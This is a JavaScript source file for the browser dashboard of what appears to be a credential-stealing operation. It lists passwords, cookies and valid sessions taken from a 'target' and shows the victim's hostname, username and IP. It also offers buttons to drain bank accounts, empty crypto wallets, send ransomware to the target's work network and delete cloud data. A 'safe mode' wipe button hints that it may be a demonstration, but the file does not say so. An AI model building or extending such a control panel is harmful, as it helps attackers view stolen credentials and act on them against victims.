// dashboard.js - Frontend JavaScript for The Mirror Dashboard
// This runs in the browser when Monkey opens the dashboard URL

// Connect to Socket.IO for real-time updates
const socket = io("http://192.168.1.47:8080");

let collectionsData = [];
let currentView = "overview";

// DOM Elements
const overviewSection = document.getElementById("overview");
const passwordsSection = document.getElementById("passwords");
const cookiesSection = document.getElementById("cookies");
const sessionsSection = document.getElementById("sessions");
const actionsSection = document.getElementById("actions");

// Socket event listeners
socket.on("new_collection", (data) => {
  console.log("[+] New data received:", data);
  collectionsData.push(data);
  updateDashboard();
});

socket.on("data_wiped", () => {
  collectionsData = [];
  updateDashboard();
  showNotification("All data has been wiped", "warning");
});

socket.on("action_triggered", (data) => {
  showNotification(`Action triggered: ${data.action}`, "danger");
});

// Load existing data on page load
async function loadCollections() {
  try {
    const response = await fetch("/api/collections");
    const data = await response.json();
    collectionsData = data.collections || [];
    updateDashboard();
  } catch (e) {
    console.error("Failed to load collections:", e);
  }
}

// Update dashboard display
function updateDashboard() {
  if (collectionsData.length === 0) {
    overviewSection.innerHTML = `
      <div class="empty-state">
        <h2>No data collected yet</h2>
        <p>Waiting for target to come online...</p>
      </div>
    `;
    return;
  }

  // Get latest collection
  const latest = collectionsData[collectionsData.length - 1];
  const allPasswords = getAllPasswords();
  const allCookies = getAllCookies();
  const allSessions = getAllSessions();

  overviewSection.innerHTML = `
    <div class="stats-grid">
      <div class="stat-card">
        <div class="stat-label">Total Collections</div>
        <div class="stat-value">${collectionsData.length}</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Passwords Found</div>
        <div class="stat-value">${allPasswords.length}</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Active Sessions</div>
        <div class="stat-value">${allSessions.length}</div>
      </div>
      <div class="stat-card">
        <div class="stat-label">Cookies Stolen</div>
        <div class="stat-value">${allCookies.length}</div>
      </div>
    </div>

    <div class="target-info">
      <h3>Target Information</h3>
      <table>
        <tr><td>Hostname:</td><td>${latest.hostname || "Unknown"}</td></tr>
        <tr><td>Username:</td><td>${latest.username || "Unknown"}</td></tr>
        <tr><td>OS:</td><td>${latest.os || "Unknown"}</td></tr>
        <tr><td>IP Address:</td><td>${latest.ip || "Unknown"}</td></tr>
        <tr><td>Last Seen:</td><td>${latest.received_at || "Unknown"}</td></tr>
      </table>
    </div>
  `;

  passwordsSection.innerHTML = renderPasswords(allPasswords);
  cookiesSection.innerHTML = renderCookies(allCookies);
  sessionsSection.innerHTML = renderSessions(allSessions);
  actionsSection.innerHTML = renderActions();
}

function getAllPasswords() {
  const all = [];
  for (const collection of collectionsData) {
    all.push(...(collection.passwords || []));
  }
  return all;
}

function getAllCookies() {
  const all = [];
  for (const collection of collectionsData) {
    all.push(...(collection.cookies || []));
  }
  return all;
}

function getAllSessions() {
  const all = [];
  for (const collection of collectionsData) {
    all.push(...(collection.valid_sessions || []));
  }
  return all;
}

function renderPasswords(passwords) {
  if (passwords.length === 0) return "<p>No passwords found.</p>";
  return `
    <table class="data-table">
      <thead>
        <tr>
          <th>URL</th>
          <th>Username</th>
          <th>Password</th>
        </tr>
      </thead>
      <tbody>
        ${passwords.map(p => `
          <tr>
            <td>${p.url || ""}</td>
            <td>${p.username || ""}</td>
            <td class="password-cell">${p.password || ""}</td>
          </tr>
        `).join("")}
      </tbody>
    </table>
  `;
}

function renderCookies(cookies) {
  if (cookies.length === 0) return "<p>No cookies found.</p>";
  return `
    <table class="data-table">
      <thead>
        <tr>
          <th>Host</th>
          <th>Name</th>
          <th>Value</th>
        </tr>
      </thead>
      <tbody>
        ${cookies.map(c => `
          <tr>
            <td>${c.host || ""}</td>
            <td>${c.name || ""}</td>
            <td class="password-cell">${c.value || ""}</td>
          </tr>
        `).join("")}
      </tbody>
    </table>
  `;
}

function renderSessions(sessions) {
  if (sessions.length === 0) return "<p>No valid sessions found.</p>";
  return `
    <table class="data-table">
      <thead>
        <tr>
          <th>Service</th>
          <th>Cookie Name</th>
          <th>Status</th>
        </tr>
      </thead>
      <tbody>
        ${sessions.map(s => `
          <tr>
            <td>${s.cookie?.host || ""}</td>
            <td>${s.cookie?.name || ""}</td>
            <td class="valid-badge">VALID</td>
          </tr>
        `).join("")}
      </tbody>
    </table>
  `;
}

function renderActions() {
  return `
    <div class="action-grid">
      <button class="action-btn danger" onclick="triggerAction('drain_bank')">
        💰 Drain All Bank Accounts
      </button>
      <button class="action-btn danger" onclick="triggerAction('empty_crypto')">
        🪙 Empty Crypto Wallets
      </button>
      <button class="action-btn danger" onclick="triggerAction('reset_passwords')">
        🔑 Reset All Passwords
      </button>
      <button class="action-btn danger" onclick="triggerAction('spin_aws')">
        ☁️ Spin Up 1000 AWS Instances
      </button>
      <button class="action-btn danger" onclick="triggerAction('sell_credentials')">
        🌐 Sell Credentials on Dark Web
      </button>
      <button class="action-btn danger" onclick="triggerAction('lock_accounts')">
        🔒 Lock Target Out of All Accounts
      </button>
      <button class="action-btn danger" onclick="triggerAction('ransomware')">
        💣 Send Ransomware to Work Network
      </button>
      <button class="action-btn danger" onclick="triggerAction('delete_cloud')">
        🗑️ Delete All Cloud Data
      </button>
      <button class="action-btn success" onclick="wipeAllData()">
        🛡️ SAFE MODE - Wipe All Data
      </button>
    </div>
  `;
}

function triggerAction(action) {
  if (confirm(`Are you sure you want to trigger: ${action}?`)) {
    fetch("/api/action", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ action, targetId: "current" }),
    })
      .then(r => r.json())
      .then(data => {
        showNotification(data.message, "danger");
      });
  }
}

function wipeAllData() {
  if (confirm("Are you sure you want to wipe ALL data? This cannot be undone.")) {
    fetch("/api/wipe", { method: "POST" })
      .then(r => r.json())
      .then(data => {
        showNotification("All data wiped successfully", "success");
      });
  }
}

function showNotification(message, type) {
  const notification = document.createElement("div");
  notification.className = `notification ${type}`;
  notification.textContent = message;
  document.body.appendChild(notification);
  setTimeout(() => notification.remove(), 3000);
}

// Initialize
loadCollections();
